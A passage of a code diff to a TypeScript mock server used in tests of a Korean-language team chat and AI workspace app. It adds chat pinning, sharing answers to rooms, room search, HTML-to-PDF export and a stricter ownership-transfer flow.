+    // "long answer": like an answer that ran over a minute (server/src/chat/runtime.ts LONG_ANSWER_MS): worth telling
+    pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat, ...(/long answer/i.test(prompt) && assistant.status !== 'stopped' ? { notify: 'answer' as const } : {}) } })
     void user
   }
 
@@ -1123,7 +1498,7 @@ export class MockServer {
     listSkillIssues: () => ({ items: [] }),
     // the "/" menu, the Skills page and the owner's checklist on the home screen: like the server, the skills the caller
     // can read (none in the seed; POST /__test/skills adds some)
-    listSkills: (c) => ({ items: this.skillsFor(c.user) }),
+    listSkills: (c) => ({ items: this.skillsFor(c.user, c.query.shadowed === '1') }),
     health: () => ({ ok: true, version: this.serverVersion, schema: { applied: 2, readerLevel: 1 }, uptimeSec: 1, time: now() }),
     setupStatus: () => ({ needed: this.setupNeeded, teamName: this.setupNeeded ? null : this.settings.teamName, defaultLocale: this.settings.defaultLocale }),
     setup: (c) => {
@@ -1146,13 +1521,14 @@ export class MockServer {
       if (!u || this.passwords.get(u.username) !== c.body.password) fail('unauthorized', 401, wrong)
       if (u!.mustChangePassword) this.tempLogins.add(u!.id)
       else this.tempLogins.delete(u!.id)
+      u!.lastSeenAt = now()
       return { cookie: this.startSession(u!), body: { me: this.me(u!, '') } }
     },
     logout: () => ({ cookie: `${DEV_SESSION_COOKIE}=; Path=/; Max-Age=0`, body: undefined }),
     me: (c) => this.me(c.user, ''),
     // team chat rooms and the people directory (the sidebar and the phone's 대화 tab read them on every page): like a
     // server whose people are in no room yet, and the active people by name only (server/src/routes/people.ts)
-    listRooms: () => ({ items: [] }),
+    listRooms: () => ({ items: this.rooms, alerts: { threadReplies: this.notifyPrefs.roomThreadReplies, quietHours: this.notifyPrefs.quietHours, timeZone: 'Asia/Seoul', messagePreview: this.notifyPrefs.messagePreview } }),
     // Slack (docs/SLACK.md): a team that uses Slack, nobody linked yet, "Sign in with Slack" not set up: Settings › 앱
     // 커넥터 shows the Slack line with how to get a link; Admin › Slack shows a connected app
     mySlack: () => ({ available: true, workspace: 'Acme', link: null, signIn: false, emailSetByOther: false }),
@@ -1162,6 +1538,15 @@ export class MockServer {
       signIn: false, redirectUrl: null,
     }),
     listPeople: () => ({ people: this.users.filter((u) => u.status === 'active').map((u) => ({ id: u.id, name: u.name })) }),
+    // set myself away (server/src/routes/people.ts): kept in my prefs; the team's dot is what /__test/presence says here
+    setMyAway: (c) => {
+      const u = c.user as User & { prefs?: Me['user']['prefs'] }
+      const next: Record<string, unknown> = { ...u.prefs }
+      if (c.body.away) next.away = true
+      else delete next.away
+      u.prefs = next as Me['user']['prefs']
+      return { away: !!c.body.away }
+    },
     updateMe: (c) => {
       const u = c.user as User & { prefs?: Me['user']['prefs'] }
       if (c.body.name) u.name = c.body.name
@@ -1215,6 +1600,14 @@ export class MockServer {
       const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: i!.role, groupIds: i!.groupIds, localeChoice: c.body.locale ?? null }, c.body.password)
       i!.usedAt = now()
       i!.usedBy = { id: u.id, name: u.name }
+      u.lastSeenAt = now()
+      // a lead link (팀장 넘기기): the owner who flagged it gets the card, an Inbox notice and the realtime notice
+      if (i!.leadFor && i!.leadBy) {
+        const at = now()
+        this.handover.card = { inviteId: i!.id, leadFor: i!.leadFor, userId: u.id, joinedAt: at, dismissed: false, by: i!.leadBy }
+        this.note(i!.leadBy, { kind: 'lead_joined', inviteId: i!.id, leadFor: i!.leadFor, joinerId: u.id, joinedAt: at })
+        this.publish({ type: 'notice', data: { level: 'info', code: 'owner_lead_joined', message: `${i!.leadFor}에게 보낸 팀장 링크로 ${u.name}님이 들어왔어요` } })
+      }
       return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, '') } }
     },
 
@@ -1223,8 +1616,13 @@ export class MockServer {
       const trash = c.query.trash === '1' || c.query.trash === 'true'
       let list = this.chats.filter((x) => !!x.deletedAt === trash)
       if (c.query.projectId) list = list.filter((x) => x.projectId === c.query.projectId)
+      if (c.query.sideRoomId) list = list.filter((x) => x.sideRoomId === c.query.sideRoomId)
       if (q) list = list.filter((x) => x.title.toLowerCase().includes(q) || this.messages.some((m) => m.chatId === x.id && m.content.toLowerCase().includes(q)))
-      return { items: [...list].sort((a, b) => (a.updatedAt < b.updatedAt ? 1 : -1)), nextCursor: null }
+      const newest = [...list].sort((a, b) => (a.updatedAt < b.updatedAt ? 1 : -1))
+      // pinned chats first (server/src/routes/chats.ts listChats), not in a search or the trash
+      if (q || trash) return { items: newest, nextCursor: null }
+      const pins = newest.filter((x) => x.pinnedAt).sort((a, b) => b.pinnedAt!.localeCompare(a.pinnedAt!))
+      return { items: [...pins, ...newest.filter((x) => !x.pinnedAt)], nextCursor: null }
     },
     chatEngines: (c) => {
       const e = this.enginesResponse()
@@ -1236,7 +1634,7 @@ export class MockServer {
     },
     createChat: (c) => {
       this.guardEngine('createChat', c.user, c.body, { engine: this.settings.defaultEngine, model: this.settings.defaultModel })
-      const chat: Chat = { id: uuidv7(), projectId: c.body.projectId ?? null, title: c.body.title ?? '', engine: c.body.engine ?? 'claude-code', model: c.body.model ?? null, createdAt: now(), updatedAt: now(), deletedAt: null, runState: 'idle' }
+      const chat: Chat = { id: uuidv7(), projectId: c.body.projectId ?? null, title: c.body.title ?? '', engine: c.body.engine ?? 'claude-code', model: c.body.model ?? null, createdAt: now(), updatedAt: now(), deletedAt: null, runState: 'idle', ...(c.body.sideRoomId ? { sideRoomId: c.body.sideRoomId } : {}) }
       this.chats.push(chat)
       return { status: 201, body: chat }
     },
@@ -1256,7 +1654,34 @@ export class MockServer {
     deleteChat: (c) => {
       const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
       chat.deletedAt = now()
+      delete chat.pinnedAt
       return { id: chat.id, deletedAt: chat.deletedAt, purgeAt: new Date(Date.now() + 7 * 86400_000).toISOString() }
+    },
+    // "상단에 고정" / "고정 해제" (server/src/chat/pins.ts). The mock keeps one pin per chat, on the chat itself (the
+    // server's are each person's own, tests/unit/b-chat-pins.test.ts)
+    pinChat: (c) => {
+      const chat = this.chats.find((x) => x.id === c.params.id && !x.deletedAt) ?? fail('not_found', 404)
+      if (!chat.pinnedAt) {
+        chat.pinnedAt = now()
+        this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'updated', chat } })
+      }
+      return chat
+    },
+    unpinChat: (c) => {
+      const chat = this.chats.find((x) => x.id === c.params.id && !x.deletedAt) ?? fail('not_found', 404)
+      if (chat.pinnedAt) {
+        delete chat.pinnedAt
+        this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'updated', chat } })
+      }
+      return chat
+    },
+    markChatSeen: (c) => {
+      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
+      if (chat.unseen) {
+        delete chat.unseen
+        this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'updated', chat } })
+      }
+      return chat
     },
     restoreChat: (c) => {
       const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
@@ -1273,6 +1698,79 @@ export class MockServer {
         else unavailable++
       }
       return { files, unavailable }
+    },
+    // "대화방에 보내기": like server/src/chat/answer-share.ts, short. A row per linked file; an answer with recorded
+    // sources has the provenance line (the room's other members, the folders of the sources I may open, more I cannot)
+    shareAnswerToRoom: (c) => {
+      const m = this.messages.find((x) => x.id === c.params.messageId && x.chatId === c.params.id && x.role === 'assistant') ?? fail('not_found', 404)
+      const room = this.rooms.find((r) => r.id === c.body.roomId) ?? fail('not_found', 404)
+      if (m.status !== 'done' || !m.content.trim()) fail('conflict', 409, '끝난 답변만 대화방에 보낼 수 있어요. 답변이 끝난 뒤 다시 보내 주세요.')
+      const list = this.roomMessages.get(room.id) ?? []
+      const again = this.sharedByClientId.get(c.body.clientMessageId)
+      if (again) return { status: 'sent', message: again, cut: !!again.sharedAnswer?.cut }
+      const { body, at, cut } = answerShareBody(c.body.note, m.content, '…(이하 생략) 전체는 내 트리나 기록에서')
+      const others = Math.max(1, room.memberCount - 1)
+      // a person's own folder and finance/ are closed to the room's other members; anything else here they open
+      const rows: AnswerShareFile[] = answerFilePaths(body.slice(at), 100).map((p) => {
+        const f = this.files.get(p)
+        if (f?.type !== 'file' || this.access(p, c.user) === 'none') return { name: '', missing: true, attach: 'hidden', unable: others }
+        const unable = p.startsWith('users/') || p.startsWith('finance/') ? others : 0
+        return { name: p.slice(p.lastIndexOf('/') + 1), path: p, missing: false, attach: !unable ? 'no' : f.data!.byteLength > SMALL_UPLOAD_MAX ? 'too_big' : 'yes', unable }
+      })
+      const used = this.sources.get(m.id) ?? []
+      const mine = used.filter((f) => this.access(f.path, c.user) !== 'none')
+      const folders = [...new Set(mine.map((f) => f.path.split('/').slice(0, -1).join('/')))]
+      const provenance = used.length ? { people: others, places: folders.map((path) => ({ kind: 'folder' as const, path })), otherPlaces: mine.length < used.length } : null
+      const confirmKey = `mock-${room.id}-${this.shareEpoch}`
+      const may = new Set(rows.filter((r) => r.attach === 'yes').map((r) => r.path!))
+      const attach = [...new Set((c.body.attach ?? []) as string[])]
+      if (rows.some((r) => r.unable > 0) || provenance) {
+        const yes = c.body.confirmKey === confirmKey || (c.body.confirmKey === undefined && (c.body.confirm ?? 0) >= others)
+        if (!yes) return { status: 'confirm', people: others, places: provenance?.places ?? [], otherPlaces: !!provenance?.otherPlaces || rows.some((r) => r.missing), files: rows, provenance, confirmKey, ...(c.body.confirmKey !== undefined ? { reason: 'changed' as const } : {}) }
+        if (attach.length > ROOM_FILES_MAX || attach.some((p) => !may.has(p))) fail('validation', 400)
+      }
+      // the team files it links to that I may open (a viewer's own check, like an AI answer in a room)
+      const linked = [...body.matchAll(/[?&]path=([^&)\s#]+)/g)].map((x) => decodeURIComponent(x[1]!))
+      const openable = [...new Set(linked)].filter((p) => this.files.get(p)?.type === 'file' && this.access(p, c.user) !== 'none')
+      const files: RoomFile[] = (may.size ? attach : []).map((p) => ({ id: uuidv7(), name: p.slice(p.lastIndexOf('/') + 1), size: this.files.get(p)!.data!.byteLength, mime: mimeOf(p) ?? 'application/octet-stream', kind: 'text', thumb: false }))
+      const seq = Math.max(room.lastSeq, 0, ...list.map((x) => x.seq)) + 1
+      const message = RoomMessage.parse({
+        id: uuidv7(), roomId: room.id, seq, authorKind: 'user', author: { id: c.user.id, name: c.user.name }, askedBy: null, visibility: 'room', body, replyTo: null,
+        mentions: [], files, createdAt: now(), editedAt: null, deletedAt: null, sharedAnswer: { at, cut }, openable,
+      })
+      list.push(message)
+      this.roomMessages.set(room.id, list)
+      this.sharedByClientId.set(c.body.clientMessageId, message)
+      Object.assign(room, { lastSeq: seq, lastReadSeq: seq, activityAt: message.createdAt, lastMessage: { id: message.id, seq, author: message.author, excerpt: body.slice(0, 120), fileCount: files.length, deleted: false, createdAt: message.createdAt } })
+      this.publish({ type: 'room.message', data: { roomId: room.id, message } })
+      return { status: 'sent', message, cut }
+    },
+    // the rooms' own reads: what was sent here, the room's people, no AI at work
+    getRoom: (c) => this.rooms.find((r) => r.id === c.params.id) ?? fail('not_found', 404),
+    listRoomMessages: (c) => {
+      const room = this.rooms.find((r) => r.id === c.params.id) ?? fail('not_found', 404)
+      return { items: this.roomMessages.get(room.id) ?? [], nextCursor: null }
+    },
+    // ⌘K: the messages of the rooms here that hold the text (one page, newest first), like the server's
+    searchRoomMessages: (c) => {
+      const q = String(c.query.q ?? '').trim().toLowerCase()
+      const items = this.rooms.flatMap((room) => (this.roomMessages.get(room.id) ?? []).filter((m) => !m.deletedAt && !m.event && m.body.toLowerCase().includes(q)).map((m) => ({ m, room })))
+        .sort((a, b) => b.m.createdAt.localeCompare(a.m.createdAt)).slice(0, Number(c.query.limit ?? 20))
+      const rooms = [...new Set(items.map((x) => x.room))].map((r) => ({ id: r.id, kind: r.kind, name: r.name, peers: r.peers, memberCount: r.memberCount }))
+      return {
+        items: items.map(({ m }) => ({ id: m.id, roomId: m.roomId, threadRootId: m.threadRootId ?? null, authorKind: m.authorKind, author: m.authorKind === 'ai' ? null : m.author, askedBy: m.authorKind === 'ai' ? m.askedBy : null, markdown: m.authorKind === 'ai' || !!m.sharedAnswer, snippet: m.body.slice(0, 200), createdAt: m.createdAt })),
+        rooms, nextCursor: null,
+      }
+    },
+    listRoomMembers: (c) => {
+      const room = this.rooms.find((r) => r.id === c.params.id) ?? fail('not_found', 404)
+      return { items: [{ id: c.user.id, name: c.user.name }, ...room.peers].map((user) => ({ user, joinedAt: room.createdAt })) }
+    },
+    getRoomAi: (c) => (this.rooms.some((r) => r.id === c.params.id) ? { answering: 0, mine: [] } : fail('not_found', 404)),
+    markRoomRead: (c) => {
+      const room = this.rooms.find((r) => r.id === c.params.id) ?? fail('not_found', 404)
+      Object.assign(room, { lastReadSeq: Math.max(room.lastReadSeq, c.body.seq), unreadCount: 0, mentioned: false })
+      return { lastReadSeq: room.lastReadSeq, unreadCount: 0, mentioned: false }
     },
     listTurnRequests: (c) => ({ items: [...this.openAsks.values()].filter((r) => r.chatId === c.params.id) }),
     sendMessage: (c) => {
@@ -1343,30 +1841,6 @@ export class MockServer {
       this.projects = this.projects.filter((p) => p.id !== c.params.id)
       return undefined
     },
-    // the dev environment (experiment) of a project, on after POST /__test/dev-env
-    devEnv: (c) => this.devEnvOf(c.user, c.params.id!),
-    devEnvActivity: (c) => {
-      this.devEnvOf(c.user, c.params.id!)
-      const by = { id: c.user.id, name: c.user.name }
-      return { items: [
-        { at: now(), by, kind: 'command' as const, text: 'npx remotion render src/index.ts Teaser out/teaser.mp4', detail: null },
-        { at: now(), by, kind: 'files' as const, text: 'created out/teaser.mp4', detail: null },
-        { at: now(), by: null, kind: 'box' as const, text: 'box stopped (idle)', detail: null },
-      ] }
-    },
-    devEnvBox: (c) => {
-      this.devEnvOf(c.user, c.params.id!)
-      this.devEnv!.box = c.body.action === 'stop' ? 'stopped' : 'running'
-      return this.devEnvOf(c.user, c.params.id!)
-    },
-    devEnvRunStop: (c) => {
-      this.devEnvOf(c.user, c.params.id!)
-      const srt = this.devEnv!.srt
-      if (!srt) fail('not_found', 404)
-      srt!.running = srt!.running.filter((r) => r.id !== c.params.runId)
-      srt!.waiting = srt!.waiting.filter((r) => r.id !== c.params.runId)
-      return this.devEnvOf(c.user, c.params.id!)
-    },
     // the team setting (Team settings › Dev environment): like server/src/routes/dev-env.ts, turning on (srt) needs the
     // current warning accepted
     devEnvTeam: () => this.devEnvTeamView(),
@@ -1395,10 +1869,6 @@ export class MockServer {
       this.devEnvTeam = after
       return this.devEnvTeamView()
     },
-    devEnvPreview: (c) => {
-      this.devEnvOf(c.user, c.params.id!)
-      return { url: `https://preview.example.invalid/${c.body.port}/`, expiresAt: new Date(Date.now() + 600_000).toISOString() }
-    },
     // srt: the caller's runs and their cancel (the chat's waiting line, "devqueue" turns)
     myDevEnvRuns: (c) => {
       const srt = this.devEnv?.srt
@@ -1413,6 +1883,13 @@ export class MockServer {
       return { running: srt!.running.filter((r) => r.by?.id === c.user.id), waiting: srt!.waiting.filter((r) => r.by?.id === c.user.id) }
     },
     listMemories: () => ({ items: this.memories, nextCursor: null }),
+    // like server/src/routes/rooms.ts (rooms/ai-grants.ts): the person's own; an unknown id is 404
+    listAiAllowances: () => ({ items: this.aiAllowances }),
+    deleteAiAllowance: (c) => {
+      if (!this.aiAllowances.some((a) => a.id === c.params.id)) fail('not_found', 404)
+      this.aiAllowances = this.aiAllowances.filter((a) => a.id !== c.params.id)
+      return undefined
+    },
     // like server/src/routes/memories.ts: folded to one line, 1–300 characters (the AI's limits), newest first
     createMemory: (c) => {
       const text = String(c.body.text).replace(/\s+/g, ' ').trim()
@@ -1493,6 +1970,36 @@ export class MockServer {
       }
       return new Response(n!.data! as unknown as BodyInit, { headers: { 'content-type': mimeOf(c.query.path!) ?? 'application/octet-stream', 'content-length': String(n!.data!.byteLength), 'content-disposition': 'attachment', 'x-content-type-options': 'nosniff', 'content-security-policy': "sandbox; default-src 'none'" } })
     },
+    // "PDF로 저장" (server/src/team-files/html-pdf-save.ts): a one-page stand-in PDF next to the page, " (2)" when taken;
+    // a folder the person cannot write: 403, and the panel downloads it instead
+    saveHtmlPdf: (c) => {
+      const page: string = c.body.path
+      const n = this.files.get(page)
+      if (!n || n.type !== 'file' || this.access(page, c.user) === 'none') fail('not_found', 404)
+      if (!/\.html?$/i.test(page)) fail('validation', 400, 'HTML 파일만 PDF로 저장할 수 있어요.')
+      if (!this.htmlPdf) fail('unavailable', 503, '이 서버에는 HTML을 PDF로 만드는 브라우저가 없어요. 관리자에게 알려 주세요.', undefined, { reason: 'unavailable' })
+      const folder = page.includes('/') ? page.slice(0, page.lastIndexOf('/')) : ''
+      if (this.access(folder, c.user) !== 'write') fail('forbidden', 403, '읽기 전용이라 바꿀 수 없어요.', undefined, { reason: 'read_only' })
+      // a page that names a finance file: the PDF would let more people see it (html-pdf-save.ts htmlPdfWider)
+      if (/finance\//.test(dec.decode(n!.data!))) fail('forbidden', 403, '이 페이지에 들어가는 파일 중 이 폴더를 보는 사람 모두가 볼 수는 없는 파일이 있어서 여기에 저장하지 않았어요.', undefined, { reason: 'wider_audience' })
+      let out = page.replace(/\.[^./]+$/, '') + '.pdf'
+      for (let i = 2; this.files.has(out); i++) out = `${page.replace(/\.[^./]+$/, '')} (${i}).pdf`
+      this.putFile(out, MOCK_PDF)
+      this.htmlPdfCalls.push({ path: page, how: 'save' })
+      return { status: 201, body: { entry: this.entry(out, this.files.get(out)!, c.user), pages: 1, blocked: /https?:\/\//.test(dec.decode(n!.data!)) ? 1 : 0, scripts: /<script\b/i.test(dec.decode(n!.data!)) } }
+    },
+    downloadHtmlPdf: (c) => {
+      // like the server: only this app starts a print (Fetch Metadata)
+      const site = c.req.headers.get('sec-fetch-site')
+      if (site !== null && site !== 'same-origin') fail('forbidden', 403, 'PDF는 이 앱에서만 만들 수 있어요.', undefined, { reason: 'cross_site' })
+      const page = c.query.path!
+      const n = this.files.get(page)
+      if (!n || n.type !== 'file' || this.access(page, c.user) === 'none') fail('not_found', 404)
+      if (!this.htmlPdf) fail('unavailable', 503, undefined, undefined, { reason: 'unavailable' })
+      this.htmlPdfCalls.push({ path: page, how: 'download' })
+      const bytes = enc.encode(MOCK_PDF)
+      return new Response(bytes as unknown as BodyInit, { headers: { 'content-type': 'application/pdf', 'content-length': String(bytes.byteLength), 'content-disposition': `attachment; filename*=UTF-8''${encodeURIComponent(page.split('/').pop()!.replace(/\.[^./]+$/, '') + '.pdf')}`, 'x-content-type-options': 'nosniff' } })
+    },
     upload: (c) => {
       const folder: string = c.body.folder
       if (this.access(folder, c.user) !== 'write') fail('forbidden', 403)
@@ -1561,6 +2068,8 @@ export class MockServer {
       this.files.delete(c.query.path!)
       const item = { id: uuidv7(), originalPath: c.query.path!, size: n.data?.byteLength ?? 0, deletedBy: { id: c.user.id, name: c.user.name }, turnId: null, deletedAt: now(), purgeAt: new Date(Date.now() + this.settings.trashRetentionDays * 86400_000).toISOString(), node: n }
       this.trash.push(item)
+      // a team skill's file or folder in the trash is a change of 팀 스킬 › 최근 변경 (server/src/skills/changes.ts)
+      if (c.query.path!.startsWith('skills/')) this.skillChange({ id: uuidv7(), at: now(), actor: { id: c.user.id, name: c.user.name }, path: c.query.path!, change: 'delete', from: null, byAi: false, kind: n.type === 'folder' ? 'folder' : null })
       return { trashId: item.id, purgeAt: item.purgeAt }
     },
     history: (c) => {
@@ -1677,6 +2186,17 @@ export class MockServer {
       const a = this.artifacts.find((x) => x.id === c.params.id && x.key === DECK_ARTIFACT_KEY) ?? fail('not_found', 404)
       return { artifactId: a.id, chatId: a.chatId, title: a.title ?? '', theme: 'paper' as const, slides: 1, pptx: false, pdf: false }
     },
+    // intro decks being built (round 2): the chat's builds, newest first, and a finished slide's small picture
+    listDeckBuilds: (c) => {
+      if (!this.chats.some((x) => x.id === c.query.chatId)) fail('not_found', 404)
+      return { builds: this.deckBuilds.filter((b) => b.chatId === c.query.chatId).reverse().slice(0, 10) }
+    },
+    deckBuildSlide: (c) => {
+      const b = this.deckBuilds.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
+      const i = Number(c.params.n)
+      if (!b.thumbs || b.slides[i]?.status !== 'done') fail('not_found', 404)
+      return new Response(slidePng(i) as unknown as BodyInit, { headers: { 'content-type': 'image/png', 'cache-control': 'private, max-age=3600' } })
+    },
     getJob: (c) => this.jobs.get(c.params.id!) ?? fail('not_found', 404),
     cancelJob: (c) => {
       const j = this.jobs.get(c.params.id!) ?? fail('not_found', 404)
@@ -1705,7 +2225,15 @@ export class MockServer {
       return u
     },
     deleteUser: (c) => {
+      const target = this.users.find((u) => u.id === c.params.id) ?? fail('not_found', 404)
+      const me = c.user
+      // as the server: an admin removes a member only, with their password again
+      if (me.role === 'admin') {
+        if (target.role !== 'member') fail('forbidden', 403)
+        if (c.body?.password !== this.passwords.get(me.username)) fail('forbidden', 403, 'wrong password')
+      }
       this.users = this.users.filter((u) => u.id !== c.params.id)
+      this.dropAssignee('user', c.params.id)
       return undefined
     },
     resetPassword: (c) => {
@@ -1717,13 +2245,56 @@ export class MockServer {
       this.resets.set(u!.id, { by: { id: c.user.id, name: c.user.name }, at: now() })
       return { temporaryPassword: temp, expiresAt: tempUntil(), signInUrl: 'https://team.example.com' }
     },
-    // like server/src/admin/users.ts transferOwnership: the password again, then the old owner becomes an admin
+    // like server/src/admin/users.ts transferOwnership: the password again (5 wrong in a row: 429 and the owner's lock
+    // notice), the target ready (active, past a temporary password, signed in once), then the old owner becomes an
+    // admin, every lead flag is cleared, the connections asked for are ended, and everyone concerned is told
     transferOwnership: (c) => {
-      if (this.passwords.get(c.user.username) !== c.body.password) fail('forbidden', 403, '비밀번호가 맞지 않아요. 다시 입력해 주세요.')
+      const h = this.handover
+      if (h.wrong >= 5) fail('rate_limited', 429)
+      if (this.passwords.get(c.user.username) !== c.body.password) {
+        if (++h.wrong >= 5) this.note(c.user.id, { kind: 'reauth_locked' })
+        fail('forbidden', 403, '비밀번호가 맞지 않아요. 다시 입력해 주세요.', { 'body.password': 'wrong password' })
+      }
+      h.wrong = 0
+      if (h.race) {
+        h.race = false
+        throw new Fail('conflict', 409, '이미 팀장이 바뀌었어요.', undefined, { reason: 'owner_changed' })
+      }
       const u = this.users.find((x) => x.id === c.body.userId && x.status === 'active') ?? fail('not_found', 404)
       if (u.id === c.user.id) fail('forbidden', 403)
+      if (u.mustChangePassword || !u.lastSeenAt) throw new Fail('conflict', 409, '아직 팀장으로 정할 수 없는 사람이에요.', undefined, { reason: 'target_not_ready' })
       for (const x of this.users) if (x.role === 'owner') x.role = 'admin'
       u.role = 'owner'
+      const ended: EndedConnection[] = []
+      for (const ref of c.body.end as { kind: HandoverConnection['kind']; id: string }[]) {
+        const conn = h.connections.find((x) => x.owner === c.user.id && x.kind === ref.kind && x.id === ref.id)
+        if (!conn) { ended.push({ kind: ref.kind, id: ref.id, label: '', result: 'gone' }); continue }
+        const failed = conn.id.startsWith('fail')
+        if (!failed) h.connections = h.connections.filter((x) => x !== conn)
+        ended.push({ kind: conn.kind, id: conn.id, label: conn.label, result: failed ? 'failed' : 'ended', ...(conn.kind === 'drive_share' && !failed ? { revoke: 'revoked' as const } : {}) })
+      }
+      // every flag goes: the open lead invite is revoked, a used one loses its flag, the card goes
+      this.invites = this.invites.filter((i) => !(i.leadFor && !i.usedAt))
+      for (const i of this.invites) if (i.leadFor) { i.leadFor = null; delete i.leadBy }
+      h.card = null
+      const counts = { teamAi: ended.filter((x) => x.result === 'ended' && x.kind === 'team_ai').length, driveShares: ended.filter((x) => x.result === 'ended' && x.kind === 'drive_share').length, failed: ended.filter((x) => x.result === 'failed').length }
+      const told = { fromId: c.user.id, toId: u.id, fromName: c.user.name, toName: u.name, ended: counts }
+      this.note(u.id, { kind: 'transferred', me: 'to', ...told })
+      this.note(c.user.id, { kind: 'transferred', me: 'from', ...told })
+      for (const a of this.users) if (a.role === 'admin' && a.id !== c.user.id && a.status === 'active') this.note(a.id, { kind: 'transferred', me: 'other', ...told })
+      this.publish({ type: 'notice', data: { level: 'info', code: 'owner_changed', message: `팀장이 ${u.name}님으로 바뀌었어요` } })
+      return { ok: true as const, ended }
+    },
+    handoverState: (c) => this.handoverStateOf(c.user),
+    // what a transfer could not end (the server's retry and the new owner's [끊기]): the mock ends nothing at a transfer it
+    // could not, so there is never anything left
+    endPendingConnections: (c) => {
+      if (c.user.role !== 'owner') fail('forbidden', 403)
+      return { ended: [], pending: 0 }
+    },
+    dismissLeadCard: (c) => {
+      const k = this.handover.card
+      if (k && k.inviteId === c.body.inviteId && k.by === c.user.id) k.dismissed = true
       return { ok: true as const }
     },
     createResetLink: (c) => {
@@ -1735,12 +2306,27 @@ export class MockServer {
     listInvites: () => ({ items: this.invites.map(({ token: _t, ...i }) => i) }),
     createInvite: (c) => {
       const token = 'inv' + uuidv7().replace(/-/g, '')
-      const i = { id: uuidv7(), role: c.body.role ?? 'member', groupIds: c.body.groupIds ?? [], createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), expiresAt: new Date(Date.now() + (c.body.expiresInHours ?? 72) * 3600_000).toISOString(), usedAt: null, usedBy: null, token }
+      // 이 사람이 팀장이에요: the owner only; a member in the team group for 72 hours; the open lead invite before it stops
+      // working (and a card of someone who joined with an older one goes)
+      const lead: string | undefined = c.body.leadFor
+      let replacedLead = false
+      if (lead !== undefined) {
+        if (c.user.role !== 'owner') fail('forbidden', 403)
+        if (c.body.role === 'admin') fail('validation', 400)
+        if (!this.handover.flag) throw new Fail('conflict', 409, undefined, undefined, { reason: 'lead_not_offered' })
+        replacedLead = this.invites.some((i) => i.leadFor && !i.usedAt)
+        this.invites = this.invites.filter((i) => !(i.leadFor && !i.usedAt))
+        this.handover.card = null
+      }
+      const hours = lead !== undefined ? 72 : (c.body.expiresInHours ?? 72)
+      const i = { id: uuidv7(), role: lead !== undefined ? 'member' as const : c.body.role ?? 'member', groupIds: lead !== undefined ? (this.welcome?.teamGroup ? [this.welcome.teamGroup.id] : []) : c.body.groupIds ?? [], createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), expiresAt: new Date(Date.now() + hours * 3600_000).toISOString(), usedAt: null, usedBy: null, leadFor: lead ?? null, ...(lead !== undefined ? { leadBy: c.user.id } : {}), token }
       this.invites.push(i)
-      const { token: _t, ...invite } = i
-      return { status: 201, body: { invite, token, url: `/invite/${token}` } }
+      const { token: _t, leadBy: _b, ...invite } = i as typeof i & { leadBy?: string }
+      return { status: 201, body: { invite, token, url: `/invite/${token}`, ...(lead !== undefined ? { replacedLead } : {}) } }
     },
     revokeInvite: (c) => {
+      // a lead invite is the owner's to revoke
+      if (c.user.role !== 'owner' && this.invites.some((i) => i.id === c.params.id && i.leadFor)) fail('forbidden', 403)
       this.invites = this.invites.filter((i) => i.id !== c.params.id)
       return undefined
     },
@@ -1749,18 +2335,16 @@ export class MockServer {
     createTeamLink: (c) => {
       if (this.teamLink) this.revokedTeamLinks.add(this.teamLink.token)
       const token = 'tl' + uuidv7().replace(/-/g, '')
-      this.teamLink = { id: uuidv7(), token, groupIds: c.body.groupIds ?? [], skillPath: c.body.skillPath ?? null, starter: c.body.skillPath ? (c.body.starter ?? null) : null, maxUses: c.body.maxUses ?? 20, uses: 0, createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), expiresAt: new Date(Date.now() + (c.body.expiresInDays ?? 14) * 86_400_000).toISOString() }
+      this.teamLink = { id: uuidv7(), token, groupIds: c.body.groupIds ?? [], skillPath: c.body.skillPath ?? null, maxUses: c.body.maxUses ?? 20, uses: 0, createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), expiresAt: new Date(Date.now() + (c.body.expiresInDays ?? 14) * 86_400_000).toISOString() }
       return { status: 201, body: this.teamLinkResponse(c.req, c.user) }
     },
-    // like the server: the open link's skill and starter change and groups are added; its address stays
+    // like the server: the open link's skill changes and groups are added; its address stays
     updateTeamLink: (c) => {
       const l = this.teamLink
       if (!l || l.uses >= l.maxUses) fail('not_found', 404)
-      const b = c.body as { skillPath?: string | null; starter?: TeamLinkStarter | null; addGroupIds?: string[] }
+      const b = c.body as { skillPath?: string | null; addGroupIds?: string[] }
       if ((b.addGroupIds ?? []).some((g) => !this.groups.some((x) => x.id === g))) fail('validation', 400, '없는 그룹이 들어 있어요.', { 'body.addGroupIds': 'unknown group' })
       if (b.skillPath !== undefined) l!.skillPath = b.skillPath
-      if (b.starter !== undefined) l!.starter = b.starter
-      if (!l!.skillPath) l!.starter = null
       l!.groupIds = [...new Set([...l!.groupIds, ...(b.addGroupIds ?? [])])]
       return this.teamLinkResponse(c.req, c.user)
     },
@@ -1787,15 +2371,9 @@ export class MockServer {
       const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: 'member', groupIds: l!.groupIds, localeChoice: c.body.locale ?? null }, c.body.password)
       l!.uses++
       const next = l!.skillPath && this.teamLinkSkillName(l!.skillPath) ? `/skills?run=${encodeURIComponent(l!.skillPath)}` : null
-      // the starter as the new member may use it: the skill they can open, the files that exist and they can read
-      const skill = l!.skillPath ? this.skillsFor(u).find((x) => x.path === l!.skillPath && !x.personal) : undefined
-      const files = (l!.starter?.files ?? []).filter((f) => this.files.get(f)?.type === 'file' && this.access(f, u) !== 'none').map((f) => ({ path: f, name: f.slice(f.lastIndexOf('/') + 1) }))
-      const by = this.users.find((x) => x.id === l!.createdBy.id)?.name ?? null
-      // who made the link's skill (S): the line above its form, or Home's arrival for a skill that asks nothing
+      // who made the link's skill (S): the line above its form (every skill lands on its form, one without fields too: W5)
       const maker = l!.skillPath ? this.users.find((x) => x.id === this.skillMakers.get(l!.skillPath!))?.name ?? null : null
